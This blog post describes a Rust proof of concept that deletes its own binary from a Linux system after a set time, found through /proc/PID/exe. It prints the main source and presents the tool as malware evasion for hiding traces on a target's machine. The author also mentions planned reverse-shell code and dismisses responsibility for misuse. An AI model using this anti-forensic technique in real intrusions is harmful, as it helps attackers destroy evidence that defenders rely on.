---
layout: default
title:  "Happy Time: Self-deleting Binary"
date:   2026-04-22 17:47:24 -0500
categories: Malware
---
This post goes over the self-deleting binary; A malware proof of concept project that I've been working on
since December of 2025. Project can be [found here](https://github.com/westwardfishdme/POC_binary_self_deletion).

# Happy Time
Such a strange name isn't it? I think that's what makes it so eye-catching. `happytime` is a malware evasion
proof of concept based on old leaked CIA documents from 2016 under the code name **Hive**. It originally was
designed to be used as a part of their infrastructure to delete the reverse shells and tools off of their C2 
clients. It never made it to the final implementation because of issues with system clock configurations.

## How it Works
Essentially, the program starts a thread inside of this `main` function here:
```rust
fn main() -> Result<(), Box<dyn Error>> {
    /* Main Function */
    eprintln!("Started self-deleting malware testing.");
    let mut bin_path: path::PathBuf = match get_malware_path() {
        Ok(v) => v,
        Err(e) => {
            eprintln!("can't get path to binary: {e}");
            PathBuf::from("")
        }
    };

    let pid = process::id();

    // thread for process daemonization
    let handle = thread::spawn(move || {
        dbg!(&bin_path, pid);

        let mut counter: u64 = 0;
        loop {
            bin_path = get_malware_path().expect("something went wrong within the thread");
            if timer(counter, SECONDS_BEFORE_DELETION) {
                match delete(&bin_path) {
                    Ok(()) => (),
                    Err(e) => eprintln!("{e}"),
                }
                break;
            }
            // sleep 1 second.
            thread::sleep(time::Duration::from_secs(1));
            counter += 1;
        }
    });
    match handle.join() {
        Ok(()) => (),
        Err(_e) => {
            process::exit(1);
        }
    };
    Ok(())
}

```
Essentially what it's doing is finding the process path to the executable inside of a symlink in the `/proc` directory and continuously tracking the binary's location.
After a set period of time, the process will then delete the binary at the path. Below is the source code overlining this process:
```rust 
fn get_malware_path() -> Result<path::PathBuf, Box<dyn Error>> {
    /*In Linux, we can get the path of a binary
     * from /proc/PID/exe, which is a symlink to
     * the binary.
     *
     * This will be the path that the software to use to delete the binary.
     * */
    let pid = process::id();
    let formatted = format!("/proc/{pid}/exe");

    let path = fs::read_link(path::PathBuf::from(formatted))?;
    match fs::exists(&path) {
        Ok(_v) => eprintln!("binary found @ {}", &path.to_string_lossy()),
        Err(_e) => {
            eprintln!("failed to get legitimate binary path.");
            let _ = get_malware_path();
        }
    }
    Ok(path)
}
fn delete(abs_path: &PathBuf) -> Result<(), Box<dyn Error>> {
    /*Deletes the path of the binary*/
    eprintln!("Deleting {BIN_NAME} @ path={:?}", abs_path);
    fs::remove_file(abs_path)?;
    Ok(())
}
```
> Note: On failure, get get_malware_path() will make a recursive call to retry and obtain that binary path.

## Applicable use
While the proof of concept's [live branch](https://github.com/westwardfishdme/POC_binary_self_deletion/tree/live) lacks any malicious code at the moment,
it's use as a part of a larger malicious ecosystem would make it invaluable to hiding any semblance of a trace inside of a target's machine. In addition,
the modularity of the project allows it to implement different forms of deletion conditions, or even allowing different levels of deletion such as overwriting
the path with garbage information before deletion.

The reason that this works as effectively as it does is because of the nature of how executables work on linux, which I will briefly explain here:

1. When an executable runs on a machine, the process will remain in memory until the process completes.
2. Linux follows the UNIX philosophy; treating everything as a file. This means that we can essentially get all the information that we need about
the executable from a file somewhere on the system, in this case the symlink `/proc/{pid}/exe` contains all of the information required for this POC
to be viable.
3. Rust compiles all of the dependencies into the binary. Allowing us to build for what we need.

In theory, this only allows us to use it on Unix-like machines; however since I haven't tested it on any other Unix-like operating systems, I can't
provide details into it's effectiveness or reliability.

## Defending its publicity.
You might ask yourself: 

- "Why make this public? Couldn't a bad actor get their hands on this and use it for their own malicious purpose?"

The answer is simply yes; but that can go for literally anything. The idea behind technology is that it is morally neutral and for general research purposes
it is better that this is public and not hidden. Let's face it, if a bad actor can already write malware; they can more than certainly implement other ways
to obscure their tracks for researchers. My proof of concept keeps the code readable so that other researchers can look at how this works at a high level.

In addition; the live branch is planned to only contain minimal source code to execute a reverse shell, search for potential exploits on the system, and do nothing 
more and nothing less.

I am someone who fiercely believes in the freedom of information, and someone else's unethical behavior is not my responsibility, nor my jurisdiction.

### Credits
S/O to the people at Langley for their work. Not a huge fan of everything you do, but your work is always impressive.
